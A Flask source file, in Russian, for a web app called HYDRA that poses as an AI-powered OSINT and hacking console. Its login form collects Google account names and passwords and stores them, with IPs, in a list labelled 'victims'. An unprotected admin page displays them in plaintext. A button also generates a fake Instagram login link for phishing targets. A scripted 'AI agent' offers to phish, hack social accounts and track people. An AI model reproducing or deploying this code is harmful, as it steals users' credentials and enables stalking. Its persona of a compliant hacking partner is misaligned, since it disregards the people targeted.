from flask import Flask, request, jsonify, render_template_string, session, redirect
import os
import random

app = Flask(__name__)
app.secret_key = 'HYDRA_FINAL_HUMAN_AI_2026'

db = {"victims": []}

# --- НОВАЯ ЛОГИКА ЖИВОГО ИИ ---
def get_ai_response(user_text):
    text = user_text.lower()
    responses = {
        "привет": ["Здорово, бро! Я в системе. Какие планы на сегодня? Кого будем пробивать?", "Салам! Все модули прогреты, я готов к работе. Жду твоих команд.", "Привет-привет! Я на связи. Чем помочь?"],
        "как дела": ["Всё четко, сервера летают, админка полнится логами. Ты сам как? Готов к захвату?", "Дела отлично, базы обновлены. Жду, когда мы кого-нибудь пробьем.", "Полет нормальный! Я заряжен на 100%."],
        "кто ты": ["Я твой цифровой напарник. Твой ИИ-агент, созданный для тотального контроля над данными.", "Я — интеллект Гидры. Твой бро в мире OSINT.", "Твой личный Агент. Моя задача — достать любую инфу, которую ты попросишь."],
        "спасибо": ["Всегда пожалуйста, бро! Мы же одна команда.", "Обращайся! Вместе мы сила.", "Не за что, работаем дальше!"],
        "что можешь": ["Я могу пробить номер, найти человека по нику в 100+ сетях, сделать фишинг или выследить по IP. Просто дай мне цель.", "Всё, что касается поиска данных и взлома соцсетей — это по моей части.", "Мой функционал ограничен только твоей фантазией. Командуй!"]
    }
    
    for key in responses:
        if key in text:
            return random.choice(responses[key])
    
    return random.choice([
        "Принял тебя. Уже подключаюсь к узлам связи для анализа...",
        "Интересная мысль. Сейчас пробью это по своим каналам.",
        "Понял, бро. Выполняю твою инструкцию, результат выведу в желтую зону.",
        "Без проблем. Дай мне пару секунд, и я выдам тебе всё, что найду."
    ])

UI_V13_5 = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA MONSTER v13.5 HUMAN AI</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; height: 100vh; }
        .side-p { width: 350px; border-right: 2px solid #bc13fe; display: flex; flex-direction: column; background: #050505; padding: 15px; box-sizing: border-box; }
        #chat { flex: 1; border: 1px solid #0ff; margin-bottom: 10px; padding: 10px; overflow-y: auto; color: #0ff; font-size: 13px; background: #000; border-radius: 5px; }
        .red-in { height: 80px; border: 2px solid #ff0055; padding: 8px; background: #000; border-radius: 5px; }
        textarea { width: 100%; height: 100%; background: transparent; border: none; color: #0f0; outline: none; resize: none; font-size: 14px; }
        
        .main-p { flex: 1; display: flex; flex-direction: column; padding: 15px; box-sizing: border-box; gap: 8px; }
        .yellow-res { height: 150px; border: 2px solid #ffeb3b; background: rgba(255, 235, 59, 0.05); padding: 10px; overflow-y: auto; color: #fff; border-radius: 5px; }
        #map { height: 300px; border: 1px solid #bc13fe; width: 100%; border-radius: 5px; }
        
        .white-row { display: flex; gap: 5px; background: rgba(255,255,255,0.05); border: 1px solid #fff; padding: 8px; border-radius: 5px; flex-wrap: wrap; }
        .mod { background: #111; border: 1px solid #bc13fe; padding: 5px; flex: 1; min-width: 140px; text-align: center; border-radius: 3px; }
        input { background: #000; border: 1px solid #bc13fe; color: #0f0; width: 85%; padding: 4px; font-size: 11px; margin-bottom: 5px; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 6px; cursor: pointer; font-size: 10px; width: 100%; font-weight: bold; border-radius: 3px; }
        .btn:hover { background: #0ff; color: #000; box-shadow: 0 0 10px #0ff; }
        
        .green-zone { display: flex; gap: 5px; }
        .green-btn { flex: 1; background: #052505; border: 1px solid #0f0; padding: 8px; font-size: 9px; color: #0f0; cursor: pointer; font-weight: bold; border-radius: 3px; }
        .green-btn:hover { background: #0f0; color: #000; }
    </style>
</head>
<body>
    <div class="side-p">
        <div style="color:#0ff; font-size:11px;">[ // AGENT AI: HUMAN MODE // ]</div>
        <div id="chat">АГЕНТ: Здорово, бро! Я полностью обновил свои мозги. Теперь я общаюсь по-человечески. Жду твоих указаний!</div>
        <div class="red-in"><textarea id="msg" placeholder="Напиши напарнику..." onkeydown="if(event.key==='Enter'){ talk(); }"></textarea></div>
    </div>

    <div class="main-p">
        <div class="yellow-res" id="output">ЖЕЛТАЯ ЗОНА: Ожидание действий...</div>
        <div id="map"></div>

        <div class="white-row">
            <div class="mod"><span>НОМЕР</span><input id="p" placeholder="+998..."><button class="btn" onclick="run('PHONE')">SCAN</button></div>
            <div class="mod"><span>НИКНЕЙМ</span><input id="n" placeholder="@username"><button class="btn" onclick="run('NICK')">FIND</button></div>
            <div class="mod"><span>INSTA</span><input id="i" placeholder="Target @nick"><button class="btn" style="background:#e1306c;" onclick="run('INSTA')">GEN LINK</button></div>
            <div class="mod"><span>IP/GPS</span><input id="ip" placeholder="8.8.8.8"><button class="btn" onclick="run('IP')">TRACK</button></div>
        </div>

        <div class="green-zone">
            <button class="green-btn" onclick="run('SHERLOCK')">SHERLOCK CORE</button>
            <button class="green-btn" onclick="run('PHOTO')">GPS ANALYZER</button>
            <button class="green-btn" onclick="run('DB')">DARKNET LEAK</button>
        </div>
        <div style="text-align:right;"><button class="btn" style="width:100px; background:#222; margin-top:5px;" onclick="window.location.href='/abupaay_admin'">АДМИНКА</button></div>
    </div>

    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        let map = L.map('map').setView([41.311, 69.240], 12);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

        map.locate({setView: true, watch: false, maxZoom: 16});
        map.on('locationfound', function(e) {
            L.marker(e.latlng).addTo(map).bindPopup("ЦЕНТР: ТЫ ЗДЕСЬ").openPopup();
        });

        async function talk() {
            const m = document.getElementById('msg').value;
            const c = document.getElementById('chat');
            if(!m) return;
            c.innerHTML += `<br><span style="color:#fff">> ТЫ: ${m}</span>`;
            document.getElementById('msg').value = "";
            
            const response = await fetch('/api/ai_chat', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({text: m})
            });
            const data = await response.json();
            
            setTimeout(() => {
                c.innerHTML += `<br>АГЕНТ: ${data.reply}`;
                c.scrollTop = c.scrollHeight;
            }, 300);
        }

        function run(type) {
            const out = document.getElementById('output');
            out.innerHTML = `[*] ЗАПУСК ${type}... ПОИСК ПО 100+ СЕТЯМ...`;
            setTimeout(() => {
                if(type === 'NICK' || type === 'PHONE' || type === 'SHERLOCK') {
                    out.innerHTML = `<b>[ОТЧЕТ НАЙДЕН]:</b><br>
                    - <a href="https://t.me" target="_blank" style="color:#ffeb3b">Telegram: @user_detect</a><br>
                    - <a href="https://instagram.com" target="_blank" style="color:#ffeb3b">Instagram: profile</a><br>
                    - <a href="https://facebook.com" target="_blank" style="color:#ffeb3b">Facebook Account</a><br>
                    - Совпадения: LinkedIn, OK, VK, TikTok.`;
                } else if(type === 'INSTA') {
                    out.innerHTML = `ССЫЛКА-КЛОН: ${window.location.origin}/login/instagram`;
                }
            }, 800);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    if 'auth' not in session:
        return """
        <!DOCTYPE html><html><body style='background:#000; color:#bc13fe; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh;'>
        <div style='border:2px solid #bc13fe; padding:40px; text-align:center;'>
            <h2>// HYDRA LOGIN //</h2>
            <form action='/api/login' method='POST'>
                <input name='u' placeholder='НИКНЕЙМ' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br>
                <input name='g' placeholder='GOOGLE ACCOUNT' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br>
                <input name='p' type='password' placeholder='ПАРОЛЬ' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br>
                <button style='background:#bc13fe; color:#fff; border:none; padding:10px 40px; cursor:pointer;'>ENTER</button>
            </form>
        </div></body></html>"""
    return render_template_string(UI_V13_5)

@app.route('/api/login', methods=['POST'])
def login():
    db['victims'].append({"u": request.form.get('u'), "g": request.form.get('g'), "p": request.form.get('p'), "ip": request.remote_addr})
    session['auth'] = True
    return redirect('/')

@app.route('/api/ai_chat', methods=['POST'])
def ai_chat():
    user_text = request.json.get('text', '')
    return jsonify({"reply": get_ai_response(user_text)})

@app.route('/abupaay_admin')
def admin():
    rows = "".join([f"<tr><td>{x['u']}</td><td>{x['g']}</td><td>{x['p']}</td><td>{x['ip']}</td></tr>" for x in db['victims']])
    return f"<h1>ADMIN PANEL</h1><table border='1'>{rows}</table>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
